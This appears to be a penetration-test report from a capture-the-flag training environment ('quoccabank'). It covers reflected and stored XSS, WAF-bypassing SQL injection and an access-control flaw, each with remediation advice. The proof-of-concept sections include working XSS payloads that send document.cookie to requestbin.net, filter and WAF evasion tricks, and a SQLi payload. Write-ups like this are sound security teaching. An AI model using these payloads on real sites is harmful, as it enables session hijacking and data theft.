### Reflected XSS - Reflected XSS in Comment Filter
**Asset Domain:** science-today.quoccabank.com
**Severity Classification:** High
**Vulnerability Details**
A reflected XSS vulnerability exists in the comment filtering system for the `science-today` blog.
**Proof of Concept / Steps to Reproduce**
We can escape the header context of our reflected input with `</h3>` - a clear lack of sanitisation of user input. 
![](/Images/Pasted%20image%2020210806161850.png)
From there, we can evade the single pass filter by nesting blacklisted tags (such as `img` and `onerror`). We can now invoke arbitrary javascript , allowing us to leak clientside secrets. 
As a POC, we leak the `query-flag` cookie by appending it to a redirect to an attacker controlled server then reporting the page (along with the comment filter parameter):
```
<imimgg src="x" oneonerrorrror="location.href='http://requestbin.net/r/du0jqnpb/?c='+btoa(document.cookie)"></imimgg>
```
![](/Images/Pasted%20image%2020210806161838.png)

**Impact**
Coupled with the automated administration system that renders javascript on reported pages, this reflected XSS vulnerability allows an attacker to leak sensitive information from privileged clients. For example, an attacker could capture clientside session tokens with which they could conduct session hijacks.  

**Remediation**
Implement a whitelist to sanitise user input at both the client and server side -  Ideally, through a well supported framework such as `jsoup`.
	
### Stored XSS - Stored XSS in Comment Section
**Asset Domain:** science-today.quoccabank.com
**Severity Classification:** High
**Vulnerability Details**
A stored XSS vulnerability exists in the comment section of the `science-today` blog.
**Proof of Concept / Steps to Reproduce**
We can easily see that no sanitisation is performed on submitted comments - allowing us to invoke arbitrary JS & HTML:
```
</p><b>awf</b>
```
![](/Images/Pasted%20image%2020210806163027.png)

Exploitation is similar to the exploitation of the above reflected XSS vulnerability. Instead of a filter to contend with, our payload must fit a somewhat tight length limit. 
Again, as a POC, we leak sensitive a clientside secret - the `flag` cookie - by appending it to a JS web request to an attacker controlled server.
```
<img src="x" onerror="new Image().src='http://requestbin.net/r/du0jqnpb/?c='+document.cookie">
```
We can then report the page to the automated administration system and leak sensitive information.

**Impact**
Coupled with the automated administration system that renders javascript on reported pages, this stored XSS vulnerability allows an attacker to leak sensitive information from privileged clients. For example, an attacker could capture clientside session tokens with which they could conduct session hijacks.

Additionally, the stored nature of the payload makes mass exploitation trivial - dramatically increasing the impact of a malicious payload.  

**Remediation**
Implement a whitelist to sanitise user input at both the client and server side -  Ideally, through a well supported framework such as `jsoup`.

### Reflected XSS - Reflected XSS in Comment Filter behind WAF
**Asset Domain:** science-tomorrow.quoccabank.com
**Severity Classification:** High
**Vulnerability Details**
A reflected XSS vulnerability exists in the comment filtering system for the `science-tomorrow` blog - identical to the reflected XSS vulnerability in `science-today.quoccabank.com`. 
**Proof of Concept / Steps to Reproduce**
See the POC for the reflected XSS vulnerability in `science-today`. 

Some adjustments must be made to contend with a new obstacle - the flawed "HackShield" WAF implemented at the `ctfproxy2` level.  

The WAF uses simple term matching to block what it sees as malicious requests. These rules can be easily evaded by taking advantage of lesser known "malicious" Javascript constructs (e.g. `eval(window.atob())` and `location.href`). 

Otherwise, exploitation follows exactly as in `science-today` - allowing us to leak the `query-flag` cookie by reporting the filtered page. 

```
<img src="x" onerror="location.href='http://requestbin.net/r/gngcllan?c='+btoa(document.cookie)"></img>
```

![](/Images/Pasted%20image%2020210806163815.png)

**Impact**
Coupled with the automated administration system that renders javascript on reported pages, this reflected XSS vulnerability allows an attacker to leak sensitive information from privileged clients. For example, an attacker could capture clientside session tokens with which they could conduct session hijacks.  

**Remediation**
Implement a whitelist to sanitise user input at both the client and server side -  Ideally, through a well supported framework such as `jsoup`.

Moreover, we recommend the adoption of a commercial WAF package in place of the current home-brew solution.


### Stored XSS - Stored XSS in Comment Section behind WAF
**Asset Domain:** science-today.quoccabank.com
**Severity Classification:** High
**Vulnerability Details**
A stored XSS vulnerability exists in the comment section of the `science-tomorrow` blog - identical to the stored XSS vulnerability in `science-today.quoccabank.com`. 
**Proof of Concept / Steps to Reproduce**
As in the above reflected XSS exploit - reproduction steps are identical to the non proxied variant albeit with the addition of a WAF bypass. The same payload produces results, allowing us to leak the `flag` cookie once the page is reported:

```
<img src="x" onerror="location.href='http://requestbin.net/r/gngcllan?c='+btoa(document.cookie)"></img>
```



**Impact**
Coupled with the automated administration system that renders javascript on reported pages, this stored XSS vulnerability allows an attacker to leak sensitive information from privileged clients. For example, an attacker could capture clientside session tokens with which they could conduct session hijacks.

Additionally, the stored nature of the payload makes mass exploitation trivial - dramatically increasing the impact of a malicious payload.  

**Remediation**
Implement a whitelist to sanitise user input at both the client and server side -  Ideally, through a well supported framework such as `jsoup`.

Moreover, we recommend the adoption of a commercial WAF package in place of the current home-brew solution.
	
### SQL Injection - SQLi in Payment Portal behind WAF
**Asset Domain:** payportal-v2.quoccabank.com
**Severity Classification:** Critical
**Vulnerability Details**
There exists an SQL injection vulnerability in the `period` parameter sent to the payment portal backend, identical to the vulnerability in `pay-portal.quoccabank.com`. 
**Proof of Concept / Steps to Reproduce**
The first (and last) line of defence against SQLi here is the WAF provided by `ctfproxy2`. By probing the parameter with inputs, we discover that the double dash comment characters `--` and ` or ` (or surrounded with whitespace) trigger the HackShield WAF. 

To bypass this blacklist matching, we simply replace our space characters with an inline comment - e.g. `1"/**/or/**/`. 

As a POC, we leak all entries in the `payportal` table with a modified `1" or "1" = "1";` payload - revealing sensitive information. 

```
1"/**/or/**/"1"="1";
```

```
https://ctfproxy2.quoccabank.com/api/payportal-v2/?period=1%22%2F**%2For%2F**%2F%221%22%3D%221%22%3B
```

![](/Images/Pasted%20image%2020210806172706.png)

**Impact**
The SQLi vulnerability enables the execution of a subset of SQL. An attacker may exfiltrate records in the local database, pivot to connected DB systems or escalate to RCE depending on the backend environment and DB configuration (unlikely here due to a lack of write privileges). 

**Remediation**
Make use of the prepared statements binding provided in the appropriate backend framework. Refer to `https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html` for further guidance.

### Incorrect Access Control - No API Key Authentication in `flagprinter` 
**Asset Domain:** flagprinter.quoccabank.com
**Severity Classification:** Medium
**Vulnerability Details**
The internal web application `flagprinter` does not check whether the supplied `ctfproxy2-key` is authorised to access the application. This oversight allows an attacker to view sensitive information.

This vulnerability seems to have been picked up by a previous audit, as the original API endpoint was disabled by an administrator. However, by creating another endpoint with the same origin, we can "reactivate" the service and retrieve sensitive information. 

**Proof of Concept / Steps to Reproduce**
The original endpoint for `flagprinter` has been disabled. However, by simply creating another endpoint with the same origin, we are able to view the web app.
![](/Images/Pasted%20image%2020210806191434.png)
![](/Images/Pasted%20image%2020210806191611.png)
![](/Images/Pasted%20image%2020210806191642.png)

Alternatively, we could forge requests to the `flagprinter` with an arbitrary username in the `ctfproxy2-user` header (and other appropriate headers to masquerade as the `ctfproxy2` server).

**Impact**
Confidential secrets are leaked from an internal development server. 

**Remediation**
Enforce stricter auditing of services before they go live. 
In this specific case - check the authorization of the `ctfproxy2-key` before responding to proxied requests.
